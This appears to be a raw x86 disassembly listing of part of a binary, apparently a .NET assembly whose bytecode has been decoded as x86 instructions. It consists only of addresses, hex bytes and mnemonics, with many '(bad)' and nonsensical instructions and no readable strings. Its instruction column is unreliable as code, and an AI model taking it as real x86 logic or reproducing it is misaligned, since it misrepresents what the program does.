  4025e6:	13 07                	adc    (%edi),%eax
  4025e8:	11 05 11 07 6f 4f    	adc    %eax,0x4f6f0711
  4025ee:	00 00                	add    %al,(%eax)
  4025f0:	0a de                	or     %dh,%bl
  4025f2:	0c 11                	or     $0x11,%al
  4025f4:	05 2c 07 11 05       	add    $0x511072c,%eax
  4025f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4025fa:	22 00                	and    (%eax),%al
  4025fc:	00 0a                	add    %cl,(%edx)
  4025fe:	dc de                	(bad)
  402600:	0c 11                	or     $0x11,%al
  402602:	04 2c                	add    $0x2c,%al
  402604:	07                   	pop    %es
  402605:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402608:	22 00                	and    (%eax),%al
  40260a:	00 0a                	add    %cl,(%edx)
  40260c:	dc de                	(bad)
  40260e:	0a 09                	or     (%ecx),%cl
  402610:	2c 06                	sub    $0x6,%al
  402612:	09 6f 22             	or     %ebp,0x22(%edi)
  402615:	00 00                	add    %al,(%eax)
  402617:	0a dc                	or     %ah,%bl
  402619:	dd 6f ff             	(bad) -0x1(%edi)
  40261c:	ff                   	(bad)
  40261d:	ff 08                	decl   (%eax)
  40261f:	2c 06                	sub    $0x6,%al
  402621:	08 6f 22             	or     %ch,0x22(%edi)
  402624:	00 00                	add    %al,(%eax)
  402626:	0a dc                	or     %ah,%bl
  402628:	13 08                	adc    (%eax),%ecx
  40262a:	72 4c                	jb     0x402678
  40262c:	05 00 70 11 08       	add    $0x8117000,%eax
  402631:	6f                   	outsl  %ds:(%esi),(%dx)
  402632:	50                   	push   %eax
  402633:	00 00                	add    %al,(%eax)
  402635:	0a 28                	or     (%eax),%ch
  402637:	4d                   	dec    %ebp
  402638:	00 00                	add    %al,(%eax)
  40263a:	0a 28                	or     (%eax),%ch
  40263c:	45                   	inc    %ebp
  40263d:	00 00                	add    %al,(%eax)
  40263f:	0a de                	or     %dh,%bl
  402641:	0a 06                	or     (%esi),%al
  402643:	2c 06                	sub    $0x6,%al
  402645:	06                   	push   %es
  402646:	6f                   	outsl  %ds:(%esi),(%dx)
  402647:	51                   	push   %ecx
  402648:	00 00                	add    %al,(%eax)
  40264a:	0a dc                	or     %ah,%bl
  40264c:	2a 00                	sub    (%eax),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	01 4c 00 00          	add    %ecx,0x0(%eax,%eax,1)
  402654:	02 00                	add    (%eax),%al
  402656:	68 00 37 9f 00       	push   $0x9f3700
  40265b:	0c 00                	or     $0x0,%al
  40265d:	00 00                	add    %al,(%eax)
  40265f:	00 02                	add    %al,(%edx)
  402661:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  402665:	ad                   	lods   %ds:(%esi),%eax
  402666:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402669:	00 00                	add    %al,(%eax)
  40266b:	00 02                	add    %al,(%edx)
  40266d:	00 47 00             	add    %al,0x0(%edi)
  402670:	74 bb                	je     0x40262d
  402672:	00 0a                	add    %cl,(%edx)
  402674:	00 00                	add    %al,(%eax)
  402676:	00 00                	add    %al,(%eax)
  402678:	02 00                	add    (%eax),%al
  40267a:	40                   	inc    %eax
  40267b:	00 8a ca 00 0a 00    	add    %cl,0xa00ca(%edx)
  402681:	00 00                	add    %al,(%eax)
  402683:	00 00                	add    %al,(%eax)
  402685:	00 02                	add    %al,(%edx)
  402687:	00 d2                	add    %dl,%dl
  402689:	d4 00                	aam    $0x0
  40268b:	1a 24 00             	sbb    (%eax,%eax,1),%ah
  40268e:	00 01                	add    %al,(%ecx)
  402690:	02 00                	add    (%eax),%al
  402692:	02 00                	add    (%eax),%al
  402694:	ec                   	in     (%dx),%al
  402695:	ee                   	out    %al,(%dx)
  402696:	00 0a                	add    %cl,(%edx)
  402698:	00 00                	add    %al,(%eax)
  40269a:	00 00                	add    %al,(%eax)
  40269c:	1b 30                	sbb    (%eax),%esi
  40269e:	03 00                	add    (%eax),%eax
  4026a0:	87 00                	xchg   %eax,(%eax)
  4026a2:	00 00                	add    %al,(%eax)
  4026a4:	0a 00                	or     (%eax),%al
  4026a6:	00 11                	add    %dl,(%ecx)
  4026a8:	72 88                	jb     0x402632
  4026aa:	05 00 70 72 98       	add    $0x98727000,%eax
  4026af:	05 00 70 02 28       	add    $0x28027000,%eax
  4026b4:	4d                   	dec    %ebp
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	0a 73 52             	or     0x52(%ebx),%dh
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	0a 25 17 6f 53 00    	or     0x536f17,%ah
  4026c2:	00 0a                	add    %cl,(%edx)
  4026c4:	25 17 6f 54 00       	and    $0x546f17,%eax
  4026c9:	00 0a                	add    %cl,(%edx)
  4026cb:	25 16 6f 55 00       	and    $0x556f16,%eax
  4026d0:	00 0a                	add    %cl,(%edx)
  4026d2:	25 17 6f 56 00       	and    $0x566f17,%eax
  4026d7:	00 0a                	add    %cl,(%edx)
  4026d9:	28 57 00             	sub    %dl,0x0(%edi)
  4026dc:	00 0a                	add    %cl,(%edx)
  4026de:	0a 06                	or     (%esi),%al
  4026e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4026e1:	58                   	pop    %eax
  4026e2:	00 00                	add    %al,(%eax)
  4026e4:	0a 6f 59             	or     0x59(%edi),%ch
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	0a 0b                	or     (%ebx),%cl
  4026eb:	06                   	push   %es
  4026ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4026ed:	5a                   	pop    %edx
  4026ee:	00 00                	add    %al,(%eax)
  4026f0:	0a 6f 59             	or     0x59(%edi),%ch
  4026f3:	00 00                	add    %al,(%eax)
  4026f5:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4026f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4026f9:	5b                   	pop    %ebx
  4026fa:	00 00                	add    %al,(%eax)
  4026fc:	0a 08                	or     (%eax),%cl
  4026fe:	28 4e 00             	sub    %cl,0x0(%esi)
  402701:	00 0a                	add    %cl,(%edx)
  402703:	2d 04 08 0d de       	sub    $0xde0d0804,%eax
  402708:	24 07                	and    $0x7,%al
  40270a:	0d de 20 06 2c       	or     $0x2c0620de,%eax
  40270f:	06                   	push   %es
  402710:	06                   	push   %es
  402711:	6f                   	outsl  %ds:(%esi),(%dx)
  402712:	22 00                	and    (%eax),%al
  402714:	00 0a                	add    %cl,(%edx)
  402716:	dc 13                	fcoml  (%ebx)
  402718:	04 72                	add    $0x72,%al
  40271a:	a0 05 00 70 11       	mov    0x11700005,%al
  40271f:	04 6f                	add    $0x6f,%al
  402721:	50                   	push   %eax
  402722:	00 00                	add    %al,(%eax)
  402724:	0a 28                	or     (%eax),%ch
  402726:	4d                   	dec    %ebp
  402727:	00 00                	add    %al,(%eax)
  402729:	0a 0d de 00 09 2a    	or     0x2a0900de,%cl
  40272f:	00 01                	add    %al,(%ecx)
  402731:	1c 00                	sbb    $0x0,%al
  402733:	00 02                	add    %al,(%edx)
  402735:	00 37                	add    %dh,(%edi)
  402737:	00 2e                	add    %ch,(%esi)
  402739:	65 00 0a             	add    %cl,%gs:(%edx)
	...
  402744:	6f                   	outsl  %ds:(%esi),(%dx)
  402745:	6f                   	outsl  %ds:(%esi),(%dx)
  402746:	00 16                	add    %dl,(%esi)
  402748:	24 00                	and    $0x0,%al
  40274a:	00 01                	add    %al,(%ecx)
  40274c:	1b 30                	sbb    (%eax),%esi
  40274e:	05 00 80 00 00       	add    $0x8000,%eax
  402753:	00 0b                	add    %cl,(%ebx)
  402755:	00 00                	add    %al,(%eax)
  402757:	11 28                	adc    %ebp,(%eax)
  402759:	5c                   	pop    %esp
  40275a:	00 00                	add    %al,(%eax)
  40275c:	0a 28                	or     (%eax),%ch
  40275e:	5d                   	pop    %ebp
  40275f:	00 00                	add    %al,(%eax)
  402761:	0a 6f 5e             	or     0x5e(%edi),%ch
  402764:	00 00                	add    %al,(%eax)
  402766:	0a 0a                	or     (%edx),%cl
  402768:	16                   	push   %ss
  402769:	0b 2b                	or     (%ebx),%ebp
  40276b:	45                   	inc    %ebp
  40276c:	06                   	push   %es
  40276d:	07                   	pop    %es
  40276e:	9a 0c 08 6f 5f 00 00 	lcall  $0x0,$0x5f6f080c
  402775:	0a 18                	or     (%eax),%bl
  402777:	33 34 08             	xor    (%eax,%ecx,1),%esi
  40277a:	6f                   	outsl  %ds:(%esi),(%dx)
  40277b:	1e                   	push   %ds
  40277c:	00 00                	add    %al,(%eax)
  40277e:	0a 17                	or     (%edi),%dl
  402780:	8d 5b 00             	lea    0x0(%ebx),%ebx
  402783:	00 01                	add    %al,(%ecx)
  402785:	25 16 1f 2e 9d       	and    $0x9d2e1f16,%eax
  40278a:	6f                   	outsl  %ds:(%esi),(%dx)
  40278b:	60                   	pusha
  40278c:	00 00                	add    %al,(%eax)
  40278e:	0a 0d 09 8e 69 1a    	or     0x1a698e09,%cl
  402794:	33 17                	xor    (%edi),%edx
  402796:	72 d4                	jb     0x40276c
  402798:	05 00 70 09 16       	add    $0x16097000,%eax
  40279d:	9a 09 17 9a 09 18 9a 	lcall  $0x9a18,$0x99a1709
  4027a4:	28 61 00             	sub    %ah,0x0(%ecx)
  4027a7:	00 0a                	add    %cl,(%edx)
  4027a9:	13 04 de             	adc    (%esi,%ebx,8),%eax
  4027ac:	28 07                	sub    %al,(%edi)
  4027ae:	17                   	pop    %ss
  4027af:	58                   	pop    %eax
  4027b0:	0b 07                	or     (%edi),%eax
  4027b2:	06                   	push   %es
  4027b3:	8e 69 32             	mov    0x32(%ecx),%gs
  4027b6:	b5 de                	mov    $0xde,%ch
  4027b8:	1a 13                	sbb    (%ebx),%dl
  4027ba:	05 72 ec 05 00       	add    $0x5ec72,%eax
  4027bf:	70 11                	jo     0x4027d2
  4027c1:	05 6f 50 00 00       	add    $0x506f,%eax
  4027c6:	0a 28                	or     (%eax),%ch
  4027c8:	4d                   	dec    %ebp
  4027c9:	00 00                	add    %al,(%eax)
  4027cb:	0a 28                	or     (%eax),%ch
  4027cd:	45                   	inc    %ebp
  4027ce:	00 00                	add    %al,(%eax)
  4027d0:	0a de                	or     %dh,%bl
  4027d2:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  4027d5:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  4027d8:	01 10                	add    %edx,(%eax)
  4027da:	00 00                	add    %al,(%eax)
  4027dc:	00 00                	add    %al,(%eax)
  4027de:	00 00                	add    %al,(%eax)
  4027e0:	61                   	popa
  4027e1:	61                   	popa
  4027e2:	00 1a                	add    %bl,(%edx)
  4027e4:	24 00                	and    $0x0,%al
  4027e6:	00 01                	add    %al,(%ecx)
  4027e8:	1b 30                	sbb    (%eax),%esi
  4027ea:	03 00                	add    (%eax),%eax
  4027ec:	36 00 00             	add    %al,%ss:(%eax)
  4027ef:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4027f2:	00 11                	add    %dl,(%ecx)
  4027f4:	73 62                	jae    0x402858
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	0a 0a                	or     (%edx),%cl
  4027fa:	06                   	push   %es
  4027fb:	02 20                	add    (%eax),%ah
  4027fd:	f4                   	hlt
  4027fe:	01 00                	add    %eax,(%eax)
  402800:	00 6f 63             	add    %ch,0x63(%edi)
  402803:	00 00                	add    %al,(%eax)
  402805:	0a 0b                	or     (%ebx),%cl
  402807:	07                   	pop    %es
  402808:	2c 0b                	sub    $0xb,%al
  40280a:	07                   	pop    %es
  40280b:	6f                   	outsl  %ds:(%esi),(%dx)
  40280c:	64 00 00             	add    %al,%fs:(%eax)
  40280f:	0a 16                	or     (%esi),%dl
  402811:	fe 01                	incb   (%ecx)
  402813:	2b 01                	sub    (%ecx),%eax
  402815:	16                   	push   %ss
  402816:	0c de                	or     $0xde,%al
  402818:	0f 06                	clts
  40281a:	2c 06                	sub    $0x6,%al
  40281c:	06                   	push   %es
  40281d:	6f                   	outsl  %ds:(%esi),(%dx)
  40281e:	22 00                	and    (%eax),%al
  402820:	00 0a                	add    %cl,(%edx)
  402822:	dc 26                	fsubl  (%esi)
  402824:	de 00                	fiadds (%eax)
  402826:	16                   	push   %ss
  402827:	2a 08                	sub    (%eax),%cl
  402829:	2a 00                	sub    (%eax),%al
  40282b:	00 01                	add    %al,(%ecx)
  40282d:	1c 00                	sbb    $0x0,%al
  40282f:	00 02                	add    %al,(%edx)
  402831:	00 06                	add    %al,(%esi)
  402833:	00 1f                	add    %bl,(%edi)
  402835:	25 00 0a 00 00       	and    $0xa00,%eax
  40283a:	00 00                	add    %al,(%eax)
  40283c:	00 00                	add    %al,(%eax)
  40283e:	00 00                	add    %al,(%eax)
  402840:	2f                   	das
  402841:	2f                   	das
  402842:	00 03                	add    %al,(%ebx)
  402844:	13 00                	adc    (%eax),%eax
  402846:	00 01                	add    %al,(%ecx)
  402848:	13 30                	adc    (%eax),%esi
  40284a:	02 00                	add    (%eax),%al
  40284c:	47                   	inc    %edi
  40284d:	00 00                	add    %al,(%eax)
  40284f:	00 0d 00 00 11 12    	add    %cl,0x12110000
  402855:	00 28                	add    %ch,(%eax)
  402857:	65 00 00             	add    %al,%gs:(%eax)
  40285a:	0a 7d 1d             	or     0x1d(%ebp),%bh
  40285d:	00 00                	add    %al,(%eax)
  40285f:	04 12                	add    $0x12,%al
  402861:	00 02                	add    %al,(%edx)
  402863:	7d 1e                	jge    0x402883
  402865:	00 00                	add    %al,(%eax)
  402867:	04 12                	add    $0x12,%al
  402869:	00 03                	add    %al,(%ebx)
  40286b:	7d 1f                	jge    0x40288c
  40286d:	00 00                	add    %al,(%eax)
  40286f:	04 12                	add    $0x12,%al
  402871:	00 04 7d 20 00 00 04 	add    %al,0x4000020(,%edi,2)
  402878:	12 00                	adc    (%eax),%al
  40287a:	15 7d 1c 00 00       	adc    $0x1c7d,%eax
  40287f:	04 12                	add    $0x12,%al
  402881:	00 7c 1d 00          	add    %bh,0x0(%ebp,%ebx,1)
  402885:	00 04 12             	add    %al,(%edx,%edx,1)
  402888:	00 28                	add    %ch,(%eax)
  40288a:	03 00                	add    (%eax),%eax
  40288c:	00 2b                	add    %ch,(%ebx)
  40288e:	12 00                	adc    (%eax),%al
  402890:	7c 1d                	jl     0x4028af
  402892:	00 00                	add    %al,(%eax)
  402894:	04 28                	add    $0x28,%al
  402896:	67 00 00             	add    %al,(%bx,%si)
  402899:	0a 2a                	or     (%edx),%ch
  40289b:	00 13                	add    %dl,(%ebx)
  40289d:	30 02                	xor    %al,(%edx)
  40289f:	00 3f                	add    %bh,(%edi)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	00 0e                	add    %cl,(%esi)
  4028a5:	00 00                	add    %al,(%eax)
  4028a7:	11 12                	adc    %edx,(%edx)
  4028a9:	00 28                	add    %ch,(%eax)
  4028ab:	3e 00 00             	add    %al,%ds:(%eax)
  4028ae:	0a 7d 2d             	or     0x2d(%ebp),%bh
  4028b1:	00 00                	add    %al,(%eax)
  4028b3:	04 12                	add    $0x12,%al
  4028b5:	00 02                	add    %al,(%edx)
  4028b7:	7d 2e                	jge    0x4028e7
  4028b9:	00 00                	add    %al,(%eax)
  4028bb:	04 12                	add    $0x12,%al
  4028bd:	00 03                	add    %al,(%ebx)
  4028bf:	7d 2f                	jge    0x4028f0
  4028c1:	00 00                	add    %al,(%eax)
  4028c3:	04 12                	add    $0x12,%al
  4028c5:	00 15 7d 2c 00 00    	add    %dl,0x2c7d
  4028cb:	04 12                	add    $0x12,%al
  4028cd:	00 7c 2d 00          	add    %bh,0x0(%ebp,%ebp,1)
  4028d1:	00 04 12             	add    %al,(%edx,%edx,1)
  4028d4:	00 28                	add    %ch,(%eax)
  4028d6:	04 00                	add    $0x0,%al
  4028d8:	00 2b                	add    %ch,(%ebx)
  4028da:	12 00                	adc    (%eax),%al
  4028dc:	7c 2d                	jl     0x40290b
  4028de:	00 00                	add    %al,(%eax)
  4028e0:	04 28                	add    $0x28,%al
  4028e2:	40                   	inc    %eax
  4028e3:	00 00                	add    %al,(%eax)
  4028e5:	0a 2a                	or     (%edx),%ch
  4028e7:	00 13                	add    %dl,(%ebx)
  4028e9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4028ec:	5f                   	pop    %edi
  4028ed:	00 00                	add    %al,(%eax)
  4028ef:	00 00                	add    %al,(%eax)
  4028f1:	00 00                	add    %al,(%eax)
  4028f3:	00 73 68             	add    %dh,0x68(%ebx)
  4028f6:	00 00                	add    %al,(%eax)
  4028f8:	0a 80 03 00 00 04    	or     0x4000003(%eax),%al
  4028fe:	1f                   	pop    %ds
  4028ff:	09 8d 43 00 00 01    	or     %ecx,0x1000043(%ebp)
  402905:	25 16 72 22 06       	and    $0x6227216,%eax
  40290a:	00 70 a2             	add    %dh,-0x5e(%eax)
  40290d:	25 17 72 28 06       	and    $0x6287217,%eax
  402912:	00 70 a2             	add    %dh,-0x5e(%eax)
  402915:	25 18 72 36 06       	and    $0x6367218,%eax
  40291a:	00 70 a2             	add    %dh,-0x5e(%eax)
  40291d:	25 19 72 42 06       	and    $0x6427219,%eax
  402922:	00 70 a2             	add    %dh,-0x5e(%eax)
  402925:	25 1a 72 50 06       	and    $0x650721a,%eax
  40292a:	00 70 a2             	add    %dh,-0x5e(%eax)
  40292d:	25 1b 72 64 06       	and    $0x664721b,%eax
  402932:	00 70 a2             	add    %dh,-0x5e(%eax)
  402935:	25 1c 72 78 06       	and    $0x678721c,%eax
  40293a:	00 70 a2             	add    %dh,-0x5e(%eax)
  40293d:	25 1d 72 86 06       	and    $0x686721d,%eax
  402942:	00 70 a2             	add    %dh,-0x5e(%eax)
  402945:	25 1e 72 90 06       	and    $0x690721e,%eax
  40294a:	00 70 a2             	add    %dh,-0x5e(%eax)
  40294d:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  402951:	04 2a                	add    $0x2a,%al
  402953:	c6                   	(bad)
  402954:	7e 32                	jle    0x402988
  402956:	00 00                	add    %al,(%eax)
  402958:	04 25                	add    $0x25,%al
  40295a:	2d 17 26 7e 31       	sub    $0x317e2617,%eax
  40295f:	00 00                	add    %al,(%eax)
  402961:	04 fe                	add    $0xfe,%al
  402963:	06                   	push   %es
  402964:	40                   	inc    %eax
  402965:	00 00                	add    %al,(%eax)
  402967:	06                   	push   %es
  402968:	73 69                	jae    0x4029d3
  40296a:	00 00                	add    %al,(%eax)
  40296c:	0a 25 80 32 00 00    	or     0x3280,%ah
  402972:	04 73                	add    $0x73,%al
  402974:	6a 00                	push   $0x0
  402976:	00 0a                	add    %cl,(%edx)
  402978:	25 17 6f 6b 00       	and    $0x6b6f17,%eax
  40297d:	00 0a                	add    %cl,(%edx)
  40297f:	6f                   	outsl  %ds:(%esi),(%dx)
  402980:	6c                   	insb   (%dx),%es:(%edi)
  402981:	00 00                	add    %al,(%eax)
  402983:	0a 2a                	or     (%edx),%ch
  402985:	00 00                	add    %al,(%eax)
  402987:	00 13                	add    %dl,(%ebx)
  402989:	30 05 00 53 00 00    	xor    %al,0x5300
  40298f:	00 0f                	add    %cl,(%edi)
  402991:	00 00                	add    %al,(%eax)
  402993:	11 7e 09             	adc    %edi,0x9(%esi)
  402996:	00 00                	add    %al,(%eax)
  402998:	04 1e                	add    $0x1e,%al
  40299a:	1f                   	pop    %ds
  40299b:	0d 6f 6d 00 00       	or     $0x6d6f,%eax
  4029a0:	0a 0a                	or     (%edx),%cl
  4029a2:	06                   	push   %es
  4029a3:	8d 5b 00             	lea    0x0(%ebx),%ebx
  4029a6:	00 01                	add    %al,(%ecx)
  4029a8:	0b 16                	or     (%esi),%edx
  4029aa:	0c 2b                	or     $0x2b,%al
  4029ac:	25 07 08 72 9a       	and    $0x9a720807,%eax
  4029b1:	06                   	push   %es
  4029b2:	00 70 7e             	add    %dh,0x7e(%eax)
  4029b5:	09 00                	or     %eax,(%eax)
  4029b7:	00 04 72             	add    %al,(%edx,%esi,2)
  4029ba:	9a 06 00 70 28 6e 00 	lcall  $0x6e,$0x28700006
  4029c1:	00 0a                	add    %cl,(%edx)
  4029c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c5:	00 00                	add    %al,(%eax)
  4029c7:	0a 28                	or     (%eax),%ch
  4029c9:	70 00                	jo     0x4029cb
  4029cb:	00 0a                	add    %cl,(%edx)
  4029cd:	9d                   	popf
  4029ce:	08 17                	or     %dl,(%edi)
  4029d0:	58                   	pop    %eax
  4029d1:	0c 08                	or     $0x8,%al
  4029d3:	06                   	push   %es
  4029d4:	32 d7                	xor    %bh,%dl
  4029d6:	07                   	pop    %es
  4029d7:	73 71                	jae    0x402a4a
  4029d9:	00 00                	add    %al,(%eax)
  4029db:	0a 72 e4             	or     -0x1c(%edx),%dh
  4029de:	06                   	push   %es
  4029df:	00 70 28             	add    %dh,0x28(%eax)
  4029e2:	4d                   	dec    %ebp
  4029e3:	00 00                	add    %al,(%eax)
  4029e5:	0a 2a                	or     (%edx),%ch
  4029e7:	00 1b                	add    %bl,(%ebx)
  4029e9:	30 02                	xor    %al,(%edx)
  4029eb:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4029ee:	00 00                	add    %al,(%eax)
  4029f0:	06                   	push   %es
  4029f1:	00 00                	add    %al,(%eax)
  4029f3:	11 28                	adc    %ebp,(%eax)
  4029f5:	2e 00 00             	add    %al,%cs:(%eax)
  4029f8:	0a 6f 2f             	or     0x2f(%edi),%ch
  4029fb:	00 00                	add    %al,(%eax)
  4029fd:	0a 6f 30             	or     0x30(%edi),%ch
  402a00:	00 00                	add    %al,(%eax)
  402a02:	0a 0a                	or     (%edx),%cl
  402a04:	02 28                	add    (%eax),%ch
  402a06:	34 00                	xor    $0x0,%al
  402a08:	00 0a                	add    %cl,(%edx)
  402a0a:	2d 07 06 02 28       	sub    $0x28020607,%eax
  402a0f:	72 00                	jb     0x402a11
  402a11:	00 0a                	add    %cl,(%edx)
  402a13:	02 1d 28 73 00 00    	add    0x7328,%bl
  402a19:	0a de                	or     %dh,%bl
  402a1b:	03 26                	add    (%esi),%esp
  402a1d:	de 00                	fiadds (%eax)
  402a1f:	2a 01                	sub    (%ecx),%al
  402a21:	10 00                	adc    %al,(%eax)
  402a23:	00 00                	add    %al,(%eax)
  402a25:	00 00                	add    %al,(%eax)
  402a27:	00 28                	add    %ch,(%eax)
  402a29:	28 00                	sub    %al,(%eax)
  402a2b:	03 13                	add    (%ebx),%edx
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	01 1b                	add    %ebx,(%ebx)
  402a31:	30 03                	xor    %al,(%ebx)
  402a33:	00 32                	add    %dh,(%edx)
  402a35:	00 00                	add    %al,(%eax)
  402a37:	00 11                	add    %dl,(%ecx)
  402a39:	00 00                	add    %al,(%eax)
  402a3b:	11 7e 74             	adc    %edi,0x74(%esi)
  402a3e:	00 00                	add    %al,(%eax)
  402a40:	0a 72 ee             	or     -0x12(%edx),%dh
  402a43:	06                   	push   %es
  402a44:	00 70 17             	add    %dh,0x17(%eax)
  402a47:	6f                   	outsl  %ds:(%esi),(%dx)
  402a48:	75 00                	jne    0x402a4a
  402a4a:	00 0a                	add    %cl,(%edx)
  402a4c:	0a 06                	or     (%esi),%al
  402a4e:	2c 0c                	sub    $0xc,%al
  402a50:	06                   	push   %es
  402a51:	7e 08                	jle    0x402a5b
  402a53:	00 00                	add    %al,(%eax)
  402a55:	04 02                	add    $0x2,%al
  402a57:	6f                   	outsl  %ds:(%esi),(%dx)
  402a58:	76 00                	jbe    0x402a5a
  402a5a:	00 0a                	add    %cl,(%edx)
  402a5c:	de 0a                	fimuls (%edx)
  402a5e:	06                   	push   %es
  402a5f:	2c 06                	sub    $0x6,%al
  402a61:	06                   	push   %es
  402a62:	6f                   	outsl  %ds:(%esi),(%dx)
  402a63:	22 00                	and    (%eax),%al
  402a65:	00 0a                	add    %cl,(%edx)
  402a67:	dc de                	(bad)
  402a69:	03 26                	add    (%esi),%esp
  402a6b:	de 00                	fiadds (%eax)
  402a6d:	2a 00                	sub    (%eax),%al
  402a6f:	00 01                	add    %al,(%ecx)
  402a71:	1c 00                	sbb    $0x0,%al
  402a73:	00 02                	add    %al,(%edx)
  402a75:	00 11                	add    %dl,(%ecx)
  402a77:	00 11                	add    %dl,(%ecx)
  402a79:	22 00                	and    (%eax),%al
  402a7b:	0a 00                	or     (%eax),%al
  402a7d:	00 00                	add    %al,(%eax)
  402a7f:	00 00                	add    %al,(%eax)
  402a81:	00 00                	add    %al,(%eax)
  402a83:	00 2e                	add    %ch,(%esi)
  402a85:	2e 00 03             	add    %al,%cs:(%ebx)
  402a88:	13 00                	adc    (%eax),%eax
  402a8a:	00 01                	add    %al,(%ecx)
  402a8c:	1b 30                	sbb    (%eax),%esi
  402a8e:	04 00                	add    $0x0,%al
  402a90:	68 00 00 00 12       	push   $0x12000000
  402a95:	00 00                	add    %al,(%eax)
  402a97:	11 72 4a             	adc    %esi,0x4a(%edx)
  402a9a:	07                   	pop    %es
  402a9b:	00 70 0a             	add    %dh,0xa(%eax)
  402a9e:	1b 8d 43 00 00 01    	sbb    0x1000043(%ebp),%ecx
  402aa4:	25 16 72 74 07       	and    $0x7747216,%eax
  402aa9:	00 70 a2             	add    %dh,-0x5e(%eax)
  402aac:	25 17 06 a2 25       	and    $0x25a20617,%eax
  402ab1:	18 72 c0             	sbb    %dh,-0x40(%edx)
  402ab4:	07                   	pop    %es
  402ab5:	00 70 a2             	add    %dh,-0x5e(%eax)
  402ab8:	25 19 02 a2 25       	and    $0x25a20219,%eax
  402abd:	1a 72 d0             	sbb    -0x30(%edx),%dh
  402ac0:	07                   	pop    %es
  402ac1:	00 70 a2             	add    %dh,-0x5e(%eax)
  402ac4:	28 36                	sub    %dh,(%esi)
  402ac6:	00 00                	add    %al,(%eax)
  402ac8:	0a 0b                	or     (%ebx),%cl
  402aca:	72 da                	jb     0x402aa6
  402acc:	07                   	pop    %es
  402acd:	00 70 07             	add    %dh,0x7(%eax)
  402ad0:	73 52                	jae    0x402b24
  402ad2:	00 00                	add    %al,(%eax)
  402ad4:	0a 25 17 6f 56 00    	or     0x566f17,%ah
  402ada:	00 0a                	add    %cl,(%edx)
  402adc:	25 16 6f 55 00       	and    $0x556f16,%eax
  402ae1:	00 0a                	add    %cl,(%edx)
  402ae3:	25 17 6f 77 00       	and    $0x776f17,%eax
  402ae8:	00 0a                	add    %cl,(%edx)
  402aea:	28 57 00             	sub    %dl,0x0(%edi)
  402aed:	00 0a                	add    %cl,(%edx)
  402aef:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402af4:	05 28 5b 00 00       	add    $0x5b28,%eax
  402af9:	0a de                	or     %dh,%bl
  402afb:	03 26                	add    (%esi),%esp
  402afd:	de 00                	fiadds (%eax)
  402aff:	2a 01                	sub    (%ecx),%al
  402b01:	10 00                	adc    %al,(%eax)
  402b03:	00 00                	add    %al,(%eax)
  402b05:	00 00                	add    %al,(%eax)
  402b07:	00 64 64 00          	add    %ah,0x0(%esp,%eiz,2)
  402b0b:	03 13                	add    (%ebx),%edx
  402b0d:	00 00                	add    %al,(%eax)
  402b0f:	01 1b                	add    %ebx,(%ebx)
  402b11:	30 03                	xor    %al,(%ebx)
  402b13:	00 72 00             	add    %dh,0x0(%edx)
  402b16:	00 00                	add    %al,(%eax)
  402b18:	13 00                	adc    (%eax),%eax
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	28 2e                	sub    %ch,(%esi)
  402b1e:	00 00                	add    %al,(%eax)
  402b20:	0a 6f 2f             	or     0x2f(%edi),%ch
  402b23:	00 00                	add    %al,(%eax)
  402b25:	0a 6f 30             	or     0x30(%edi),%ch
  402b28:	00 00                	add    %al,(%eax)
  402b2a:	0a 0a                	or     (%edx),%cl
  402b2c:	7e 07                	jle    0x402b35
  402b2e:	00 00                	add    %al,(%eax)
  402b30:	04 0b                	add    $0xb,%al
  402b32:	16                   	push   %ss
  402b33:	0c 2b                	or     $0x2b,%al
  402b35:	4c                   	dec    %esp
  402b36:	07                   	pop    %es
  402b37:	08 9a 72 f4 07 00    	or     %bl,0x7f472(%edx)
  402b3d:	70 28                	jo     0x402b67
  402b3f:	78 00                	js     0x402b41
  402b41:	00 0a                	add    %cl,(%edx)
  402b43:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  402b48:	2e 09 11             	or     %edx,%cs:(%ecx)
  402b4b:	04 9a                	add    $0x9a,%al
  402b4d:	13 05 11 05 02 1b    	adc    0x1b020511,%eax
  402b53:	6f                   	outsl  %ds:(%esi),(%dx)
  402b54:	79 00                	jns    0x402b56
  402b56:	00 0a                	add    %cl,(%edx)
  402b58:	2d 17 11 05 06       	sub    $0x6051117,%eax
  402b5d:	1b 6f 79             	sbb    0x79(%edi),%ebp
  402b60:	00 00                	add    %al,(%eax)
  402b62:	0a 2d 0c 11 05 28    	or     0x2805110c,%ch
  402b68:	3d 00 00 0a de       	cmp    $0xde0a0000,%eax
  402b6d:	03 26                	add    (%esi),%esp
  402b6f:	de 00                	fiadds (%eax)
  402b71:	11 04 17             	adc    %eax,(%edi,%edx,1)
  402b74:	58                   	pop    %eax
  402b75:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402b78:	04 09                	add    $0x9,%al
  402b7a:	8e 69 32             	mov    0x32(%ecx),%gs
  402b7d:	cb                   	lret
  402b7e:	08 17                	or     %dl,(%edi)
  402b80:	58                   	pop    %eax
  402b81:	0c 08                	or     $0x8,%al
  402b83:	07                   	pop    %es
  402b84:	8e 69 32             	mov    0x32(%ecx),%gs
  402b87:	ae                   	scas   %es:(%edi),%al
  402b88:	de 03                	fiadds (%ebx)
  402b8a:	26 de 00             	fiadds %es:(%eax)
